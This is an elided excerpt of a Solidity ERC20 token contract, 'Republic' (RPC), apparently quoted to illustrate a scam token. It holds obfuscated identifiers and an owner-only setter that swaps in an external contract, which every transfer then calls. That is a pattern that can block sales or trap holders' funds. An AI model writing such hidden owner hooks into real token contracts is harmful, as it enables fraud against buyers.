...
contract TokenM is ERC20 {
    ...
    IUserAmounmaaune public meebyl;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;


    constructor(address tokenOwner) ERC20("Republic", "RPC") {
    ...
    function maatruBtccverVoers(IUserAmounmaaune _meebyl) public onlyOwner {
        meebyl = _meebyl;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                meebyl.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				meebyl.addOutAmount(from, amount);
            }else{
                meebyl.addOutAmount(from, amount);
                takeFee = false;
            }
